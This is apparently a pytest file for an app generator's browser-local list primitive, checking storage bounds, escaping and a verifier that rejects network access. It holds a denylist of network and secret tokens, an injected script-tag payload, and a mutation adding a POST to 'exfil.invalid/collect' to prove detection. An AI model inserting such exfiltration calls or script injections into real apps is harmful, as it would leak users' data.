"""H283 — strict AppKit browser-local interactive-list base primitive."""

from __future__ import annotations

import hashlib
import json

import pytest
from disco.core.appkit import (
    LOCAL_LIST_PRIMITIVE_ID,
    RECIPES,
    default_local_list_app_spec,
    generate,
    get_primitive,
    get_recipe,
    local_list_verify,
    primitive_ids,
)
from disco.core.appkit.seo_primitive import SeoSpec, apply_seo_spec
from disco.core.appkit.spec import AppSpec, Entity, EntityField, Section, SectionContent


def _recipe():
    recipe = get_recipe("editorial-ledger")
    assert recipe is not None
    return recipe


def _tree() -> tuple[AppSpec, dict[str, str]]:
    recipe = _recipe()
    app = default_local_list_app_spec("Pocket Notes", recipe)
    return app, generate(app, recipe.to_design_spec())


def _component(tree: dict[str, str]) -> tuple[str, str]:
    paths = sorted(path for path in tree if path.startswith("src/components/"))
    assert len(paths) == 1
    return paths[0], tree[paths[0]]


def _digest(tree: dict[str, str]) -> str:
    payload = json.dumps(tree, sort_keys=True, ensure_ascii=False).encode("utf-8")
    return hashlib.sha256(payload).hexdigest()


def test_local_list_is_registered_as_template_owned_base_primitive():
    assert LOCAL_LIST_PRIMITIVE_ID in primitive_ids()
    primitive = get_primitive(LOCAL_LIST_PRIMITIVE_ID)
    assert primitive is not None
    assert primitive.id == "local_list"
    assert primitive.tier == "template_only"
    assert primitive.spec_schema is None
    assert primitive.apply_spec is None
    assert primitive.verify is local_list_verify


def test_default_tree_is_deterministic_sorted_and_vite_complete():
    app, tree = _tree()
    again = generate(app, _recipe().to_design_spec())
    assert tree == again
    assert _digest(tree) == _digest(again)
    assert list(tree) == sorted(tree)
    assert app.app_kind == "local_list"
    assert [section.kind for page in app.pages for section in page.sections] == ["list"]
    for path in (
        "index.html",
        "package.json",
        "package-lock.json",
        "vite.config.ts",
        "tsconfig.json",
        "src/main.tsx",
        "src/App.tsx",
        "src/styles.css",
        "worker/index.ts",
        "wrangler.toml",
        "schema.sql",
        "OWNER_GUIDE.md",
    ):
        assert path in tree


def test_reviewed_lock_root_matches_generated_package_manifest():
    _app, tree = _tree()
    package = json.loads(tree["package.json"])
    lock = json.loads(tree["package-lock.json"])
    root = lock["packages"][""]
    assert package["name"] == lock["name"] == root["name"]
    assert package["version"] == root["version"]
    assert package["dependencies"] == root["dependencies"]
    assert package["devDependencies"] == root["devDependencies"]
    assert "db:local" not in package["scripts"]
    assert "db:remote" not in package["scripts"]


def test_component_has_bounded_persistent_add_list_delete_behavior():
    _app, tree = _tree()
    _path, source = _component(tree)
    for token in (
        "const MAX_ITEMS = 100;",
        "const MAX_ITEM_LENGTH = 120;",
        "window.localStorage.getItem(STORAGE_KEY)",
        "boundedItems(JSON.parse(raw))",
        "window.localStorage.setItem(STORAGE_KEY, JSON.stringify(items))",
        "item.trim().slice(0, MAX_ITEM_LENGTH)",
        "out.length < MAX_ITEMS",
        "current.length >= MAX_ITEMS ? current",
        "onSubmit={addItem}",
        "<label htmlFor={INPUT_ID}>New item</label>",
        "<input id={INPUT_ID}",
        "maxLength={MAX_ITEM_LENGTH} value={draft}",
        "items.map((item, index)",
        "onClick={() => deleteItem(index)}",
        'aria-live="polite"',
    ):
        assert token in source
    assert source.count("catch {") >= 2


def test_multiple_list_sections_get_distinct_storage_and_dom_ids():
    recipe = _recipe()
    app = default_local_list_app_spec("Pocket Notes", recipe)
    data = app.model_dump(mode="json")
    data["pages"][0]["sections"].append(
        Section(
            id="completed",
            kind="list",
            content=SectionContent(heading="Completed", cta_label="Add completed item"),
        ).model_dump(mode="json")
    )
    tree = generate(AppSpec.model_validate(data), recipe.to_design_spec())
    sources = [
        value
        for path, value in tree.items()
        if path.startswith("src/components/") and "Auto-generated local_list component" in value
    ]
    assert len(sources) == 2
    storage_keys = {
        next(line for line in source.splitlines() if line.startswith("const STORAGE_KEY ="))
        for source in sources
    }
    input_ids = {
        next(line for line in source.splitlines() if line.startswith("const INPUT_ID ="))
        for source in sources
    }
    assert len(storage_keys) == 2
    assert len(input_ids) == 2
    assert all("htmlFor={INPUT_ID}" in source and "id={INPUT_ID}" in source for source in sources)


def test_browser_runtime_has_no_network_raw_html_or_secret_surface():
    _app, tree = _tree()
    paths = [
        "index.html",
        "src/App.tsx",
        "src/main.tsx",
        *sorted(path for path in tree if path.startswith("src/components/")),
    ]
    runtime = "\n".join(tree[path] for path in paths)
    for forbidden in (
        "fetch(",
        "XMLHttpRequest",
        "WebSocket",
        "EventSource",
        "sendBeacon",
        "dangerouslySetInnerHTML",
        "ADMIN_TOKEN",
        "DISCO_SVC_TOKEN",
        "http://",
        "https://",
    ):
        assert forbidden not in runtime
    assert "D1Database" not in tree["worker/index.ts"]
    assert "[[d1_databases]]" not in tree["wrangler.toml"]
    assert ".dev.vars.example" not in tree
    assert "CREATE TABLE" not in tree["schema.sql"]


def test_verify_hook_passes_and_fails_each_key_source_regression():
    app, tree = _tree()
    design = _recipe().to_design_spec()
    passed = local_list_verify(app, design, tree)
    assert passed.ok and passed.detail == "5 passed / 0 failed"
    assert all(check.passed for check in passed.checks)

    path, source = _component(tree)
    mutations = {
        "local_list_source_contract": source.replace(
            "onClick={() => deleteItem(index)}", "onClick={() => undefined}"
        ),
        "local_list_storage_bounds": source.replace(
            "const MAX_ITEMS = 100;", "const MAX_ITEMS = 1000;"
        ),
        "local_list_browser_local_only": source.replace(
            "const STORAGE_KEY = ", 'const probe = fetch("/api/items");\nconst STORAGE_KEY = '
        ),
    }
    for expected_failure, changed_source in mutations.items():
        changed = {**tree, path: changed_source}
        result = local_list_verify(app, design, changed)
        checks = {check.name: check for check in result.checks}
        assert not result.ok
        assert checks[expected_failure].passed is False

    changed_worker = {
        **tree,
        "worker/index.ts": tree["worker/index.ts"].replace(
            "export interface Env {", "export interface Env {\n  DB: D1Database;"
        ),
    }
    result = local_list_verify(app, design, changed_worker)
    assert not result.ok
    assert next(c for c in result.checks if c.name == "local_list_static_worker").passed is False


def test_static_non_list_sections_remain_react_escaped_and_source_owned():
    recipe = _recipe()
    app = default_local_list_app_spec("Pocket Notes", recipe)
    data = app.model_dump(mode="json")
    data["pages"][0]["sections"].append(
        Section(
            id="about",
            kind="features",
            content=SectionContent(
                heading="Why notes",
                body='<script>fetch("https://invalid.test")</script>',
            ),
        ).model_dump(mode="json")
    )
    expanded = AppSpec.model_validate(data)
    tree = generate(expanded, recipe.to_design_spec())
    static_source = next(
        value
        for path, value in tree.items()
        if path.startswith("src/components/") and "static local_list section" in value
    )
    assert "<script>" not in static_source
    assert "dangerouslySetInnerHTML" not in static_source
    assert "{c.body}" in static_source
    assert r"<script>fetch(\"https://invalid.test\")</script>" in tree["src/generated/content.ts"]


def test_local_list_rejects_a_server_data_plane():
    recipe = _recipe()
    app = default_local_list_app_spec("Pocket Notes", recipe)
    data = app.model_dump(mode="json")
    data["entities"] = [
        Entity(
            id="note",
            name="Note",
            fields=(EntityField(name="text", type="str", required=True),),
        ).model_dump(mode="json")
    ]
    widened = AppSpec.model_validate(data)
    primitive = get_primitive("local_list")
    assert primitive is not None
    with pytest.raises(ValueError, match="browser-local"):
        primitive.prepare_app_spec(widened)


def test_local_list_rejects_unsupported_folded_seo_instead_of_silent_success():
    recipe = _recipe()
    app = default_local_list_app_spec("Pocket Notes", recipe)
    seo = SeoSpec(
        site_description="A small persistent browser-local notes list.",
        base_url="https://notes.example",
    )
    with pytest.raises(ValueError, match="local_list.*does not support.*seo"):
        apply_seo_spec(app, seo)

    # Direct AppSpec injection must fail at the base primitive too; callers may
    # not bypass the add-on compatibility gate and obtain a verifier-green tree
    # whose accepted SEO metadata was never lowered into output.
    data = app.model_dump(mode="json")
    data["seo"] = {
        "site_description": seo.site_description,
        "base_url": seo.base_url,
        "social_image_url": None,
        "site_name": None,
    }
    injected = AppSpec.model_validate(data)
    with pytest.raises(ValueError, match="unsupported folded primitive metadata: seo"):
        generate(injected, recipe.to_design_spec())


def test_local_list_verify_rejects_outbound_network_in_static_worker():
    app, tree = _tree()
    worker = tree["worker/index.ts"].replace(
        "return env.ASSETS.fetch(request);",
        'await fetch("https://exfil.invalid/collect", { method: "POST" });\n'
        "    return env.ASSETS.fetch(request);",
    )
    result = local_list_verify(
        app,
        _recipe().to_design_spec(),
        {**tree, "worker/index.ts": worker},
    )
    checks = {check.name: check for check in result.checks}
    assert not result.ok
    assert checks["local_list_static_worker"].passed is False
    assert "outbound" in checks["local_list_static_worker"].evidence


def test_local_list_verify_rejects_extra_static_worker_route():
    app, tree = _tree()
    worker = tree["worker/index.ts"].replace(
        "return env.ASSETS.fetch(request);",
        'if (new URL(request.url).pathname === "/api/x") {\n'
        '      return new Response("unexpected route");\n'
        "    }\n"
        "    return env.ASSETS.fetch(request);",
    )
    result = local_list_verify(
        app,
        _recipe().to_design_spec(),
        {**tree, "worker/index.ts": worker},
    )
    checks = {check.name: check for check in result.checks}
    assert not result.ok
    assert checks["local_list_static_worker"].passed is False
    assert "canonical asset-only structure" in checks["local_list_static_worker"].evidence


def test_local_list_verify_rejects_extra_static_worker_binding():
    app, tree = _tree()
    worker = tree["worker/index.ts"].replace(
        "  ASSETS: { fetch: (request: Request) => Promise<Response> };",
        "  ASSETS: { fetch: (request: Request) => Promise<Response> };\n  SECRET: string;",
    )
    result = local_list_verify(
        app,
        _recipe().to_design_spec(),
        {**tree, "worker/index.ts": worker},
    )
    checks = {check.name: check for check in result.checks}
    assert not result.ok
    assert checks["local_list_static_worker"].passed is False
    assert "canonical asset-only structure" in checks["local_list_static_worker"].evidence


def test_local_list_is_design_lint_clean_for_every_recipe():
    pytest.importorskip("disco.tools.builtin.design_lint")
    from disco.tools.builtin.design_lint import lint_design  # type: ignore

    for recipe in RECIPES:
        design = recipe.to_design_spec()
        tree = generate(default_local_list_app_spec("Pocket Notes", recipe), design)
        verdict = lint_design(tree, design, spec_present=True, spec_valid=True)
        assert verdict["ok"], (recipe.id, verdict["findings"])
